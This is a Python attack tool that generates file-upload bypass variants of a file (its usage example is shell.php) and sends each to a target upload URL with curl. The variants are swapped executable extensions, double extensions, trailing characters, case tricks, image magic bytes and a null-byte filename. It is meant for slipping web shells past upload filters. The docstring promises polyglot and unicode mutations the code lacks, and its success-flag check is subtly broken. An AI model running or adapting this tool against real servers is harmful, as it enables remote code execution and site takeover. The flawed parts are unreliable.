#!/usr/bin/env python3
"""multipart_mutator.py — file upload mutation generator + sender.

Usage:
    python3 tools/multipart_mutator.py --file ./shell.php --field file \
        --url "https://target/upload" --send
    python3 tools/multipart_mutator.py --file ./x.png --field file --list-only

Mutations:
  - extension swap: .php → .php3/.php4/.php5/.phtml/.pht/.phar/.shtml
  - double extension: shell.php.jpg, shell.jpg.php, shell.php%00.jpg
  - trailing chars: shell.php., shell.php%20, shell.php%0a, shell.php ..
  - case tricks: shell.PHP, shell.pHp
  - content-type confusion: image/png with PHP content
  - magic bytes prepend: GIF89a / JPEG / PNG headers
  - polyglot first-line: `GIF89a<?php ...`
  - filename in quotes/unicode (Zalgo-lite), null-byte filename
"""

from __future__ import annotations

import argparse
import os
import subprocess
import sys
import uuid
from pathlib import Path

EXTENSIONS = [".php", ".php3", ".php4", ".php5", ".php7", ".phtml", ".pht", ".phar",
              ".shtml", ".asp", ".aspx", ".asa", ".cer", ".jsp", ".jspx", ".war",
              ".cgi", ".pl", ".sh", ".py", ".svg", ".html", ".htm"]
MAGIC = {"gif": b"GIF89a", "jpeg": b"\xff\xd8\xff\xe0", "png": b"\x89PNG\r\n\x1a\n",
         "webp": b"RIFF"}


def mutations(src: Path, content: bytes) -> list[dict]:
    base = src.stem
    out: list[dict] = []
    orig_ext = src.suffix or ".txt"

    # 1. extension swaps
    for ext in EXTENSIONS:
        out.append({"filename": f"{base}{ext}", "content": content,
                    "content_type": "application/octet-stream", "note": f"ext swap {orig_ext}->{ext}"})

    # 2. double extension
    for ext in (".php", ".phtml", ".phar", ".jsp"):
        out.append({"filename": f"{base}.{ext}.jpg", "content": content,
                    "content_type": "image/jpeg", "note": f"double ext {ext}.jpg"})
        out.append({"filename": f"{base}.jpg.{ext}", "content": content,
                    "content_type": "image/jpeg", "note": f"double ext jpg.{ext}"})

    # 3. trailing chars
    for tail in (".", " ", "%20", "\n", "\r\n", "::$DATA"):
        out.append({"filename": f"{base}{orig_ext}{tail}", "content": content,
                    "content_type": "application/octet-stream", "note": f"trailing {tail!r}"})

    # 4. case tricks
    out.append({"filename": f"{base}.PHP", "content": content,
                "content_type": "application/octet-stream", "note": "upper ext"})
    out.append({"filename": f"{base}.pHp", "content": content,
                "content_type": "application/octet-stream", "note": "mixed ext"})

    # 5. magic bytes prepend (each)
    for name, magic in MAGIC.items():
        out.append({"filename": f"{base}{orig_ext}", "content": magic + content,
                    "content_type": f"image/{name}", "note": f"{name} magic bytes"})

    # 6. null byte
    out.append({"filename": f"{base}.php%00.jpg", "content": content,
                "content_type": "image/jpeg", "note": "null byte"})

    return out


def build_curl(args, m: dict) -> list[str]:
    tmp = Path(f"/tmp/mpm_{uuid.uuid4().hex}.bin")
    tmp.write_bytes(m["content"])
    return [
        "curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
        "-F", f"{args.field}=@{tmp};filename={m['filename']};type={m['content_type']}",
        args.url,
    ]


def main() -> int:
    ap = argparse.ArgumentParser(description="Upload mutation generator")
    ap.add_argument("--file", required=True, help="source file path")
    ap.add_argument("--field", default="file", help="multipart field name")
    ap.add_argument("--url", help="upload URL (required for --send)")
    ap.add_argument("--send", action="store_true", help="send all mutations")
    ap.add_argument("--list-only", action="store_true")
    args = ap.parse_args()

    src = Path(args.file)
    if not src.exists():
        print(f"[-] no such file: {src}", file=sys.stderr)
        return 2
    content = src.read_bytes()

    muts = mutations(src, content)
    print(f"[*] {len(muts)} mutations generated from {src.name}")

    if args.list_only:
        for m in muts:
            print(f"  {m['filename']:35s} [{m['content_type']}]  {m['note']}")
        return 0

    if args.send:
        if not args.url:
            print("[-] --url required with --send", file=sys.stderr)
            return 2
        print(f"[*] sending to {args.url}")
        for i, m in enumerate(muts, 1):
            try:
                code = subprocess.run(build_curl(args, m), capture_output=True,
                                      text=True, timeout=20).stdout.strip()
                flag = " <<<" if code in ("200", "201", "302") and code != "200" else ""
                print(f"  [{i:3d}] {m['filename']:35s} -> HTTP {code}{flag}")
            except subprocess.TimeoutExpired:
                print(f"  [{i:3d}] {m['filename']:35s} -> TIMEOUT")
        return 0

    ap.print_help()
    return 2


if __name__ == "__main__":
    sys.exit(main())